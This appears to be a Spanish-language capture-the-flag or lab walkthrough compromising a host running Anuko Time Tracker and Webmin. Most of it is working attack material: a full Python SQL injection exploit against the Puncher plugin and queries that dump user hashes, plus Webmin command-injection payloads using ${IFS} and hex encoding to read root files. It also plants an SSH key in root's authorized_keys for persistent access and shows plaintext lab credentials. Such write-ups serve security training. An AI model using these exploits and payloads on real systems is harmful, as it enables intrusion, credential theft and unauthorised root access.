Dicha version, contenia una vulnerabilidad `SQL Injection`. Sin embargo, en el plugin donde la misma se da, esta desactivado, a pesar de esto, como `admin`de la pagina, podemos crear un grupo, con los permisos adecuados para activar dicho Plugin.

Para crearlo seleccionamos en `Create Group`.

![](/images/name/imagen-9BLS6Kwy.png){width="auto"}

Luego creamos un usuario con su password, y le damos a `Submit`.

![](/images/name/imagen-nmLU9cON.png){width="auto"}

Nos conectamos con sus credenciales.

![](/images/name/imagen-l8QfsZ4g.png){width="auto"}

Y se puede ver en la parte superior de la pagina, como la seccion de `Plugin` esta habilitada.

![](/images/name/imagen-UZg9jnXu.png){width="auto"}

Seleccionamos `Puncher` para habilitarlo y se damos a `Save`.

![](/images/name/imagen-EesiaWjP.png){width="auto"}

El siguiente paso, es crear un projecto cualquiera, con el que el propio script de a continuacion va a usar para realizar la inyeccion.

![](/images/name/imagen-Hz5jA0Xl.png){width="auto"}

Simplemente se completan los campos y le damos a `Add`.

![](/images/name/imagen-KCLRgd5X.png){width="auto"}

El script, fue algo modificado por temas de errores, quedaria de la siguiente manera:

```python
from time import time
import requests
import argparse
import re
from bs4 import BeautifulSoup
from datetime import datetime, timedelta


def get_puncher_page():
    punch_txt = r_client.get(host + "/puncher.php").text

    if "Feature is disabled" in punch_txt:
        print("[-] Puncher feature is disabled.")
        exit(0)

    print("[+] Puncher feature is enabled. Picking a project...")

    soup = BeautifulSoup(punch_txt, features="lxml")
    time_record_form = soup.find("select", {"name": "project", "id": "project"})

    project_list = time_record_form.find_all("option")

    if len(project_list) <= 1:
        print("[-] No project to choose from")
        exit(0)

    f_proj = project_list[1]

    print("[*] Picking the first project in the option: [{} - {}]".format(f_proj['value'], f_proj.text))

    return f_proj['value']


def login(username, password):
    global r_client

    data = {
        "login": username,
        "password": password,
        "btn_login": "Login",
    }

    login_txt = r_client.post(host + "/login.php", data=data).text
    if "Incorrect" in login_txt:
        print("[-] Failed to login. Credentials are not correct.")
        exit(0)

    print("[+] Login successful!")


def start_puncher(project_id):
    global r_client

    data = {
        "project": project_id,
        "btn_start": "Start",
        "browser_today": "",
        "browser_time": "04:00",
        "date": "{}-{}-{}".format(date.year, date.month, date.day)
    }

    headers = {
        "Referer": host + "/puncher.php"
    }

    start_p = r_client.post(host + "/puncher.php", data=data, headers=headers).text

    if "Uncompleted entry already" in start_p:
        print("[-] A running puncher entry is seen. Exiting")
        exit(0)

    print("[*] Puncher started. Getting id added...")

    puncher_p = r_client.get(host + "/puncher.php?date={}-{}-{}".format(date.year, date.month, date.day)).text

    time_edit_ids = re.findall(r"time_edit\.php\?id=\d+", puncher_p)
    
    if not time_edit_ids:
        print("[-] No se encontraron IDs de puncher. Guardando HTML...")
        with open("puncher_debug.html", "w") as f:
            f.write(puncher_p)
        exit(0)
    
    time_edit_ids.sort()

    latest_id = time_edit_ids[-1].split("=")[1]

    print(f"[DEBUG] Puncher ID encontrado: {latest_id}")

    return latest_id


def stop_puncher_sqli(project_id, sqli=""):
    get_all_tables = "SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()"

    if sqli == "":
        sqli = get_all_tables

    print(f"[DEBUG] SQL Query: {sqli}")

    new_date = date + timedelta(minutes=10)


    injection_payload = "{}-{}-{}', comment=(({})), date='{}-{}-{}".format(
        date.year, date.month, date.day, 
        sqli, 
        date.year, date.month, date.day
    )

    data = {
        "btn_stop": "Stop",
        "browser_today": "",
        "browser_time": "04:10",
        "date": injection_payload
    }

    print(f"[DEBUG] Injection payload: {injection_payload}")

    headers = {
        "Referer": host + "/puncher.php"
    }

    stop_p = r_client.post(host + "/puncher.php", data=data, headers=headers, allow_redirects=False)
    
    print(f"[DEBUG] Response status: {stop_p.status_code}")
    print(f"[DEBUG] Response length: {len(stop_p.text)}")

    print("[*] Puncher stopped")


def get_puncher_result(puncher_id):
    print(f"[DEBUG] Recuperando resultado del puncher ID: {puncher_id}")
    
    time_edit_url = host + "/time_edit.php?id={}".format(puncher_id)
    print(f"[DEBUG] URL: {time_edit_url}")
    
    time_edit_p = r_client.get(time_edit_url).text


    with open(f"time_edit_{puncher_id}.html", "w") as f:
        f.write(time_edit_p)
    print(f"[DEBUG] HTML guardado en time_edit_{puncher_id}.html")

    soup = BeautifulSoup(time_edit_p, features="lxml")
    

    note_content = soup.find("textarea", {"name": "note", "id": "note"})

    if note_content:
        result = note_content.text.strip()
        print(f"[+] Leaked ({len(result)} chars): {result}")
    else:
        print("[-] No se encontró el campo 'note' en la página")
        

        all_textareas = soup.find_all("textarea")
        print(f"[DEBUG] Se encontraron {len(all_textareas)} textareas")
        for i, ta in enumerate(all_textareas):
            print(f"[DEBUG] Textarea {i}: name={ta.get('name')}, id={ta.get('id')}")
            print(f"[DEBUG] Contenido: {ta.text[:100]}")


def delete_puncher_entry(puncher_id):
    data = {
        "delete_button": "Delete",
        "id": puncher_id
    }

    headers = {
        "Referer": host + "/time_delete.php?id={}".format(puncher_id)
    }

    del_p = r_client.post(host + "/time_delete.php?id={}".format(puncher_id), data=data, headers=headers)

    print(f"[*] Puncher {puncher_id} deleted")


parser = argparse.ArgumentParser()

parser.add_argument('--username', required=True, help="Anuko Timetracker username")
parser.add_argument('--password', required=True, help="Anuko Timetracker password")
parser.add_argument('--host', required=True, help="e.g. http://target.website.local, http://10.10.10.10, http://192.168.23.101:8000")
parser.add_argument('--sqli', required=False, default=None, help="SQL query to run. Defaults to getting all tables")
parser.add_argument('--no-delete', action='store_true', help="No eliminar la entrada del puncher (útil para debug)")
args = parser.parse_args()

r_client = requests.Session()
host = args.host
date = datetime.now()

username = args.username
password = args.password

login(username, password)
proj_id = get_puncher_page()
puncher_id = start_puncher(proj_id)

if args.sqli:
    print(f"[*] Using custom SQL query")
    stop_puncher_sqli(proj_id, sqli=args.sqli)
else:
    print(f"[*] Using default SQL query (list tables)")
    stop_puncher_sqli(proj_id)

get_puncher_result(puncher_id)

if not args.no_delete:
    delete_puncher_entry(puncher_id)
else:
    print(f"[*] Entrada del puncher {puncher_id} NO eliminada (puedes verla en la web)")
```

Para ejecutarlo, colocamos el usuario, password y el host, donde el mismo se encarga de la inyeccion principal, para ver las tablas de la base de datos actual, revelando la tabla `tt_users`.

```bash
python3 punch.py --username admin2 --password 'Lalahola23!$' --host http://172.16.210.34
```

![](/images/name/imagen-n84jxmcM.png){width="auto"}

Listamos columnas con el parametro `--sqli`, donde vemos el campo `login` y `password`.

```bash
python3 punch.py --username admin2 --password 'Lalahola23!$' --host http://172.16.210.34 --sqli "SELECT GROUP_CONCAT(column_name SEPARATOR ',') FROM information_schema.columns WHERE table_schema='timetracker' AND table_name='tt_users'"
```

![](/images/name/imagen-0t8d7kfh.png){width="auto"}

Siguiente y ultimo paso, dumpear cada columnas con sus datos, revelando asi el hash `md5` del usuario `svc_webmin`.

```bash
python3 punch.py --username admin2 --password 'Lalahola23!$' --host http://172.16.210.34 --sqli "SELECT GROUP_CONCAT(CONCAT_WS('|',id,login,email,password,group_id,role_id,status) SEPARATOR ';') FROM tt_users"
```

![](/images/name/imagen-GbK0kb3w.png){width="auto"}

El mismo se rompio, en [CrackStation](https://crackstation.net/), revelando asi su password en texto plano.

![](/images/name/imagen-fMkncGat.png){width="auto"}

Con su password, nos dirigimos al puerto `10000` del mismo host, donde vemos que corre el servicio de `Webmin` y en el mismo nos logueamos con las credenciales del usuario `svc_webmin`.

![](/images/name/imagen-NQRgtdhx.png){width="auto"}

Este servicio, revela su version en el codigo fuente de la pagina.

![](/images/name/imagen-FfsJqCFt.png){width="auto"}

Para dicha version existe una vulnerabilidad que permite a un atacante autenticado, ejecutar remotamente codigo.

De la manera manual, se hace de la siguiente forma:

Primero hay que ir a `http://172.16.210.34:10000/package-updates` y seleccion en la pestaña `Only New`.

![](/images/name/imagen-zROVF2mN.png){width="auto"}

Luego de eso, buscamos `ssh`, donde nos van a aparecer muchos paquetes para instalar.

![](/images/name/imagen-Jns70z1g.png){width="auto"}

Seleccionamos alguno y le damos a  `Install Selected Packages`.

![](/images/name/imagen-HQLG15F4.png){width="auto"}

Luego de eso interceptamos la peticion con `Burpsuite` que se hace al clickear en `Install now`, enviandola al `Repeater`.

![](/images/name/imagen-9iikUoOI.png){width="auto"}

La vulnerabilidad reside en el parametro `u`, donde le podemos pasar un paquete cualquiera, y luego usar `;` el cual es el separador de comandos en `Linux` para poder ejecutar codigo.

![](/images/name/imagen-qHY1aFT3.png){width="auto"}

```bash
echo -n "/root/flag.txt" | xxd -p
```
Description: Conversion de la `flag` en hexadecimal para poder visualizarla y bypassear la validacion de `/`

```bash
cat${IFS}$(echo${IFS}2f726f6f742f666c61672e747874|xxd${IFS}-r${IFS}-p)
```

![](/images/name/imagen-O6CVZTAj.png){width="auto"}

La otra manera que se encontro, es con [este exploit](https://github.com/p0dalirius/CVE-2022-36446-Webmin-Software-Package-Updates-RCE), publico.

Que se ejecuta de la siguiente forma, dandon una shell interactiva, que sin embargo, hay que escapar las `/`.

```bash
python3 cve_webmin.py -t http://172.16.210.34:10000 -u svc_webmin -p 'webm@ster' -I
```

![](/images/name/imagen-PC1Ql03G.png){width="auto"}

Para ganar acceso a `ssh`, simplemente colocamos en hexadecimal el comando que queremos ejecutar en el sistema, en este caso, colocarl el contenido de la clave publica `ed_25519` en el directorio `/root/.ssh/` en el archivo `authorized_keys`.

```bash
echo -n 'echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHYizaWJFVQdYo+vdpnsvBSKRsMMHLFkQx2hapU0zDI9 root@kali" > /root/.ssh/authorized_keys' | xxd -p
```

![](/images/name/imagen-dy6BYVoq.png){width="auto"}

Con la cadena que nos queda, repetimos el caso anterior, solo que en este caso usamos `eval`.

```bash
eval${IFS}$(echo${IFS}6563686f20227373682d65643235353139204141414143334e7a6143316c5a4449314e54453541414141494859697a61574a46565164596f2b7664706e737642534b52734d4d484c466b51783268617055307a44493920726f6f74406b616c6922203e202f726f6f742f2e7373682f617574686f72697a65645f6b657973|xxd${IFS}-r${IFS}-p)
```

Para validar que el contenido este en la ubicacion, hacemos repetimos.

```bash
echo -n '/root/.ssh/authorized_keys' | xxd -p
```

Y el output, lo vemos con `cat`.

```bash
cat${IFS}$(echo${IFS}2f726f6f742f2e7373682f617574686f72697a65645f6b657973|xxd${IFS}-r${IFS}-p)
```

![](/images/name/imagen-q7rKNfsO.png){width="auto"}

Ahora que el archivo esta en su ubicacion, nos conectamos a `ssh` usando nuestra clave privada.

```bash
ssh root@172.16.210.34 -i /root/.ssh/id_ed25519
```

![](/images/name/imagen-MxOSmdjn.png){width="auto"}

![](/images/name/imagen-pdLnlJSw.png){width="auto"}
Description: Flag `14` inside the machine.